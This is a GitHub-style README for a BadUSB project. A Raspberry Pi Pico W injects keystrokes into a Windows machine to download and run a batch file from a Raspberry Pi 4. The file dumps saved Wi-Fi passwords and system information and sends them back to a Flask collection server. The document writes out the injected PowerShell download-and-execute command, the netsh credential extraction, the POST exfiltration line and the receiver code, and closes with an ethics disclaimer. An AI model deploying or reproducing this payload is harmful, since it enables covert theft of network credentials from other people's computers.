# 🔥 BadUSB Wi-Fi Data Extractor with Raspberry Pi 4 & Pico W

## 📖 Overview
This project demonstrates how a **Raspberry Pi Pico W** can emulate a **BadUSB device**, injecting commands to a Windows machine via HID (Human Interface Device). The script downloads a **batch file (`testscript.bat`)** from a **local server running on a Raspberry Pi 4**, executes it, and sends back **Wi-Fi credentials and system information**.

---

## 🛠️ **Hardware Used**
- ✅ **Raspberry Pi 4** (runs the HTTP server and collects data)
- ✅ **Raspberry Pi Pico W** (acts as a BadUSB, injects keystrokes)
- ✅ **Target Machine** (Windows-based, where the script runs)

---

## 🏗️ **Project Structure**

```
GitHub repository is structured as follows:
📦 YourRepo  ┣ 📂 httpserver                              ┃  
             ┣ 📜 server.py                               ┣ 📜 testscript.bat
             ┗ 📜 README.md # Documentation (this file)   ┣ 📜 code.py
             ┗ 📜 .gitignore
```



---

## 📥 **Setup & Installation**

### 🖥️ **1. Setting Up Raspberry Pi 4 (HTTP Server)**
The Raspberry Pi 4 will act as a **web server** hosting `testscript.bat` and collecting data sent from the Windows machine.

#### 🔹 **Step 1: Install Dependencies**
First, install **Flask** (for handling data uploads):
```bash
sudo apt update && sudo apt install python3 python3-pip -y
pip3 install flask
```
#### 🔹 **Step 2: Install Dependencies**
```bash
git clone https://github.com/JelleWierenga/Keystroke-injection/tree/main/badusb
cd badusb/httpserver
```

#### 🔹 **Step 3: Inside your repo, create the required folders and files:**
```bash
mkdir httpserver
touch code.py
touch httpserver/server.py
touch httpserver/testscript.bat
touch httpserver/README.md
touch .gitignore
```

#### 🔹 **Step 4: Run the HTTP Server**
To start a basic file server on port `8080`, run:
```bash
python3 -m http.server 8080
```
This allows the Windows machine to download `testscript.bat`.
#### 🔹 **Step 5: Run the HTTP Server**
Now, launch the Flask server (`server.py`) to receive Wi-Fi credentials:
```bash
python3 server.py
```
**The Flask server listens on port** `5000` and stores incoming data in `collected_data.txt`.

### 🎛️ **2. Setting Up the Raspberry Pi Pico W (BadUSB Payload)**
The Pico W will act as a BadUSB device, injecting keystrokes to download and execute the batch script from the Raspberry Pi 4.

#### 🔹 **Step 1: Install CircuitPython**
1. Download the latest CircuitPython firmware for the Pico W from:
   👉 https://circuitpython.org/board/raspberry_pi_pico_w/
2. Hold **BOOTSEL** on the Pico W and connect it via USB.
3. Drag and drop the `.uf2` file onto the RPI-RP2 drive.

#### 🔹 **Step 2: Install Required CircuitPython Libraries**
Download and place these libraries in `CIRCUITPY/lib/`:
`adafruit_hid`
`usb_hid`
#### 🔹 **Step 3: Upload `code.py` to the Pico W**
Copy `code.py` from the GitHub repository to `CIRCUITPY/` on the Pico W.
#### 🔹 **Step 4: Test the BadUSB Execution**
Once plugged into a Windows machine, the Pico W will:
1. **Open CMD via Win + R**
2. **Run a PowerShell command to download** `testscript.bat`
3. **Execute the script, extract Wi-Fi passwords, and send them to the Pi 4**

## 🚀 How It Works
### 📡 1.  BadUSB Payload Execution (Pico W)
The `code.py` script simulates keyboard input, injecting:

```bash
Invoke-WebRequest -Uri "http://{rpi ip}:8080/testscript.bat" -OutFile "C:\\Temp\\testscript.bat"; Start-Process -FilePath "cmd.exe" -ArgumentList "/c C:\\Temp\\testscript.bat" -NoNewWindow -Wait
```
This **downloads and executes** the `testscript.bat` file.

### 🖥️ 2. Batch Script Execution on Windows
The t`estscript.bat` script:

1. Retrieves system information (`systeminfo`)
2. Extracts stored Wi-Fi credentials:
```bash
netsh wlan show profile name="SSID" key=clear
```
3. Sends the data back to the Raspberry Pi 4 via:
```bash
Invoke-WebRequest -Uri "http://{rpi ip}:5000/upload" -Method POST -InFile "C:\\Temp\\wifi_password.txt" -ContentType "text/plain"
```

### 🌍 3. Data Reception & Storage (Pi 4)
The `server.py` script listens for POST requests and logs incoming data:
```python
from flask import Flask, request
app = Flask(__name__)
@app.route('/upload', methods=['POST'])
def upload():
    data = request.data.decode("utf-8")
    with open("collected_data.txt", "a") as f:
        f.write(data + "\n")
    return "Data received", 200
app.run(host='0.0.0.0', port=5000)
```

## 🛡️ Security & Ethical Considerations
🚨 **This project should only be used for educational and security research purposes on your own devices!** 🚨
* Do **NOT** use this on unauthorized systems.
* **Penetration testing without consent is illegal.**
* Modify the project to collect **only your own network information.**

## ⚠️ Disclaimer
I, the creator of this project, am **not responsible for any misuse, harm, or illegal activities** conducted using this tool. This project is intended **strictly for educational and ethical hacking purposes**. Any misuse of this information is **solely the responsibility of the user.**